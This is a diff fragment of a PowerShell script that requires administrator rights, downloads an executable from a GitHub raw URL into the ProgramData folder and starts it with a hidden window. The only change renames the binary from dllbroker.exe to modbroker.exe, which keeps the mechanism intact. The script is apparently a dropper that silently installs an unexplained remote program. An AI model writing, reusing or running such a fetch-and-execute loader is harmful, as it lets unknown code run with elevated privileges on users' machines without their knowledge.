@@ -3,9 +3,9 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-$url = "https://github.com/AnatolyPivder/mod_pository/raw/refs/heads/main/dllbroker.exe"
+$url = "https://github.com/AnatolyPivder/mod_pository/raw/refs/heads/main/modbroker.exe"
 
-$outputPath = "$env:ProgramData\dllbroker.exe"
+$outputPath = "$env:ProgramData\modbroker.exe"
 (New-Object System.Net.WebClient).DownloadFile($url, $outputPath)
 
 Start-Process -FilePath $outputPath -WindowStyle Hidden
